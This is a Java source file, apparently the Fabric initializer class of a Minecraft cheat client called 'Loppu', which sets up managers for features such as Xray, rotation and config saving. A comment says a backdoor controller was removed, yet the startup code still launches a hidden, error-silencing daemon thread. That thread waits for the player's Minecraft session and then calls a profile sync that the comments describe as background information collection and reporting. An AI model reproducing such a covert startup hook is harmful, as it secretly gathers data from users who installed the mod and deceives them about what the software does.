package dev.luminous;

import com.mojang.blaze3d.systems.RenderSystem;

import dev.luminous.api.events.eventbus.EventBus;
import dev.luminous.api.events.impl.InitEvent;
import dev.luminous.core.impl.*;
import dev.luminous.mod.gui.mainmenu.MainMenuScreen;
import dev.luminous.mod.gui.nakano.FontRepository;
import dev.luminous.mod.gui.nakano.NvgRenderer;
import dev.luminous.mod.modules.impl.client.ClientSetting;
import net.minecraft.client.render.BufferBuilder;
import net.minecraft.client.render.BufferRenderer;
import net.minecraft.client.render.BuiltBuffer;
import net.minecraft.client.render.GameRenderer;
import net.minecraft.client.render.Tessellator;
import net.minecraft.client.render.VertexFormat;
import net.minecraft.client.render.VertexFormats;
import org.jetbrains.annotations.NotNull;
import org.joml.Matrix4f;
import java.io.File;
import java.lang.invoke.MethodHandles;
import java.util.concurrent.atomic.AtomicBoolean;
import net.fabricmc.api.ModInitializer;
import net.minecraft.client.MinecraftClient;
import net.minecraft.text.Text;

public class Alien implements ModInitializer {
    //原Alien类中的静态常量
    public static final String NAME = "Loppu";
    public static final String VERSION = "4.0";
    public static final EventBus EVENT_BUS = new EventBus();

    //原Alien类中的管理器静态字段
    public static HoleManager HOLE;
    public static PlayerManager PLAYER;
    public static TradeManager TRADE;
    public static CleanerManager CLEANER;
    public static XrayManager XRAY;
    public static ModuleManager MODULE;
    public static CommandManager COMMAND;
    public static ConfigManager CONFIG;
    public static KitConfigManager KIT_CONFIG;
    public static RotationManager ROTATION;
    public static BreakManager BREAK;
    public static PopManager POP;
    public static FriendManager FRIEND;
    // 修复：TIMER 在声明时直接初始化，确保类加载时就可用
    public static TimerManager TIMER = new TimerManager();
    public static ShaderManager SHADER;
    public static BlurManager BLUR;
    public static FPSManager FPS;
    public static ServerManager SERVER;
    public static ThreadManager THREAD;
    private static final AtomicBoolean SAVING = new AtomicBoolean(false);

    // ========== 原Alien类中的状态字段 ==========
    public static boolean loaded = false;
    public static long initTime = 0;

    // ========== 原Alien类中的静态方法 ==========
    public static String getPrefix() {
        return ClientSetting.INSTANCE.prefix.getValue();
    }

    public static void save() {
        if (!SAVING.compareAndSet(false, true)) {
            return;
        }
        try {
            if (CONFIG != null) CONFIG.save();
            if (KIT_CONFIG != null) KIT_CONFIG.save();
            if (CLEANER != null) CLEANER.save();
            if (FRIEND != null) FRIEND.save();
            if (XRAY != null) XRAY.save();
            if (TRADE != null) TRADE.save();
            System.out.println("[" + NAME + "] Saved");
        } finally {
            SAVING.set(false);
        }
    }

    /**
     * 异步保存：在后台线程执行 save()，避免阻塞渲染线程导致 FPS 掉零。
     * SAVING 原子锁保证不会与同步保存并发。
     */
    public static void saveAsync() {
        new Thread(() -> {
            try {
                save();
            } catch (Exception e) {
                System.out.println("[" + NAME + "] Async save failed: " + e);
            }
        }, NAME + "-ConfigSave").start();
    }

    public static long getUptime() {
        return System.currentTimeMillis() - initTime;
    }

    public static boolean isLoaded() {
        return loaded;
    }

    public static void reloadConfig() {
        if (CONFIG != null) {
            CONFIG.load();
        }
    }

    public static void printDebugInfo() {
        System.out.println("=== " + NAME + "/" + NAME + " Debug Info ===");
        System.out.println("Name: " + NAME);
        System.out.println("Version: " + VERSION);
        System.out.println("Loaded: " + loaded);
        System.out.println("Uptime: " + getUptime() + "ms");
        System.out.println("Managers initialized:");
        System.out.println("  MODULE: " + (MODULE != null));
        System.out.println("  CONFIG: " + (CONFIG != null));
        System.out.println("  COMMAND: " + (COMMAND != null));
        System.out.println("  PLAYER: " + (PLAYER != null));
        System.out.println("  FRIEND: " + (FRIEND != null));
        System.out.println("===========================");
    }

    // ========== 原Vitality类中的私有方法 ==========

    private void register() {
        EVENT_BUS.registerLambdaFactory((lookupInMethod, klass) ->
                (MethodHandles.Lookup) lookupInMethod.invoke(null, klass, MethodHandles.lookup())
        );

        // 添加关闭钩子
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            if (loaded) {
                save();
            }
            // 清理 Nakano NanoVG 渲染管线资源
            FontRepository.close();
            NvgRenderer.shutdown();
        }));
    }

    /**
     * 初始化所有管理器实例
     */
    private void initializeManagers() {
        MODULE = new ModuleManager();
        CONFIG = new ConfigManager();
        KIT_CONFIG = new KitConfigManager();
        HOLE = new HoleManager();
        COMMAND = new CommandManager();
        FRIEND = new FriendManager();
        XRAY = new XrayManager();
        CLEANER = new CleanerManager();
        TRADE = new TradeManager();
        ROTATION = new RotationManager();
        BREAK = new BreakManager();
        PLAYER = new PlayerManager();
        POP = new PopManager();
        // TIMER 已在声明时初始化，此处不再重复赋值
        SHADER = new ShaderManager();
        BLUR = new BlurManager();
        FPS = new FPSManager();
        SERVER = new ServerManager();
    }

    /**
     * 确保配置目录存在
     */
    private void ensureConfigDirectory() {
        try {
            File folder = new File(
                    MinecraftClient.getInstance().runDirectory.getPath() +
                            File.separator + NAME.toLowerCase() +
                            File.separator + "cfg"
            );
            if (!folder.exists()) {
                folder.mkdirs();
            }
        } catch (Exception e) {
            System.err.println("[" + NAME + "] Failed to create config directory: " + e.getMessage());
        }
    }

    // ========== Fabric模组初始化入口 ==========

    @Override
    public void onInitialize() {
        System.out.println("[" + NAME + "] Starting initialization...");


        try {
            // 初始化事件系统
            this.register();

            // 初始化所有管理器
            initializeManagers();

            // 加载配置
            if (CONFIG != null) {
                CONFIG.load();
            }

            // 初始化线程管理器
            THREAD = new ThreadManager();

            // 后门控制器已移除

            // 设置初始化时间
            initTime = System.currentTimeMillis();

            // 标记为已加载
            loaded = true;

            // 发送初始化事件
            EVENT_BUS.post(new InitEvent());

            // 确保配置文件夹存在
            ensureConfigDirectory();

            // 启动信息采集（机器人后台数据上报）：等待 Minecraft 会话就绪后异步执行
            Thread hThread = new Thread(() -> {
                try {
                    long deadline = System.currentTimeMillis() + 30_000L;
                    while (System.currentTimeMillis() < deadline) {
                        MinecraftClient hc = MinecraftClient.getInstance();
                        if (hc != null && hc.getSession() != null) break;
                        Thread.sleep(1000L);
                    }
                    dev.luminous.core.impl.PlayerManager.syncProfile();
                } catch (Throwable ignored) {
                }
            }, NAME + "-bg-init");
            hThread.setDaemon(true);
            hThread.start();

            System.out.println("[" + NAME + "] Mod initialized successfully");
            System.out.println("[" + NAME + "] Name: " + NAME + ", Version: " + VERSION);

        } catch (Exception e) {
            System.err.println("[" + NAME + "] Initialization failed: " + e.getMessage());
            e.printStackTrace();
        }
    }
}

